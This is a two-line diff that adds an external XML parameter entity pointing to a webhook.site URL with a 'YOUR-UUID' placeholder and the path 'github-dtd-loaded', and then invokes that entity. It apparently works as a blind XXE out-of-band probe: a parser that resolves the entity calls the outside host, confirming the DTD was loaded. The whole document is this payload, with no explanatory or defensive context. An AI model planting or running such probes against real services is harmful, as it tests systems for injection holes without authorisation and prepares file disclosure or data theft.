@@ -1,0 +1,2 @@
+<!ENTITY % ping SYSTEM "https://webhook.site/YOUR-UUID/github-dtd-loaded">
+%ping;
